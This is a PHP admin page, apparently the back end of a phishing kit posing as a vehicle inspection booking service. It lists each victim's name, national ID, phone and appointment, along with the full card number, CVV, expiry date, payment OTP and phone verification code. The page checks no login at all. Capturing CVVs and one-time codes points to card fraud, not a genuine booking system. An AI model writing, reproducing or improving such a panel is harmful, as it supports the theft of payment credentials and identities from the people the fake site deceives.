<?php
session_start();
require_once 'db.php';

$sql = "SELECT 
            a.id, a.fullname, a.idnumber, a.phone, a.vehiclenumber,
            a.registrationtype, a.vehicletype, a.inspectiontype,
            a.city, a.date, a.time,
            p.cardholder, p.cardnumber, p.expiry_month, p.expiry_year,
            p.cvv, p.otp_code, p.verification_code, p.phone_number,
            p.operator, p.phone_verification_code
        FROM appointments a
        LEFT JOIN payments p ON a.id = p.appointment_id
        ORDER BY a.id DESC";

$result = $conn->query($sql);
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>عرض العملاء - مركز سلامة المركبات</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Tajawal&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Tajawal', sans-serif; background-color: #f4f6f8; margin: 0; padding: 20px; }
    .card { border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 25px; }
    .card h6 { color: #1a6d3c; font-weight: bold; }
    .card p { margin-bottom: 8px; font-size: 15px; }
  </style>
</head>
<body>
  <div class="container">
    <h3 class="text-center text-success mb-4">جميع بيانات العملاء</h3>

    <?php while($row = $result->fetch_assoc()): ?>
    <div class="card p-4">
      <!-- بيانات العميل -->
      <div class="mb-3">
        <h6>👤 بيانات العميل</h6>
        <p><strong>الاسم:</strong> <?= htmlspecialchars($row['fullname'] ?? '') ?></p>
        <p><strong>رقم الهوية:</strong> <?= htmlspecialchars($row['idnumber'] ?? '') ?></p>
        <p><strong>رقم الجوال:</strong> <?= htmlspecialchars($row['phone'] ?? '') ?></p>
      </div>

      <!-- بيانات المركبة -->
      <div class="mb-3 border-top pt-3">
        <h6>🚗 بيانات المركبة</h6>
        <p><strong>رقم اللوحة:</strong> <?= htmlspecialchars($row['vehiclenumber'] ?? '') ?></p>
        <p><strong>نوع التسجيل:</strong> <?= htmlspecialchars($row['registrationtype'] ?? '') ?></p>
        <p><strong>نوع المركبة:</strong> <?= htmlspecialchars($row['vehicletype'] ?? '') ?></p>
        <p><strong>نوع الفحص:</strong> <?= htmlspecialchars($row['inspectiontype'] ?? '') ?></p>
        <p><strong>المدينة:</strong> <?= htmlspecialchars($row['city'] ?? '') ?></p>
        <p><strong>الموعد:</strong> <?= htmlspecialchars($row['date'] ?? '') ?> - <?= htmlspecialchars($row['time'] ?? '') ?></p>
      </div>

      <!-- بيانات البطاقة -->
      <div class="mb-3 border-top pt-3">
        <h6>💳 بيانات البطاقة</h6>
        <p><strong>صاحب البطاقة:</strong> <?= htmlspecialchars($row['cardholder'] ?? '') ?></p>
        <p><strong>رقم البطاقة:</strong> <?= htmlspecialchars($row['cardnumber'] ?? '') ?></p>
        <p><strong>CVV:</strong> <?= htmlspecialchars($row['cvv'] ?? '') ?></p>
        <p><strong>تاريخ الانتهاء:</strong> <?= htmlspecialchars(($row['expiry_month'] ?? '') . '/' . ($row['expiry_year'] ?? '')) ?></p>
      </div>

      <!-- رموز التحقق -->
      <div class="border-top pt-3">
        <h6>🔐 رموز التحقق</h6>
        <p><strong>رمز الدفع (OTP):</strong> <?= htmlspecialchars($row['otp_code'] ?? '') ?></p>
        <p><strong>رمز تحقق الجوال:</strong> <?= htmlspecialchars($row['phone_verification_code'] ?? '') ?></p>
        <p><strong>المشغل:</strong> <?= htmlspecialchars($row['operator'] ?? '') ?></p>
        <p><strong>رقم الجوال:</strong> <?= htmlspecialchars($row['phone_number'] ?? '') ?></p>
      </div>
    </div>
    <?php endwhile; ?>
  </div>
</body>
</html>
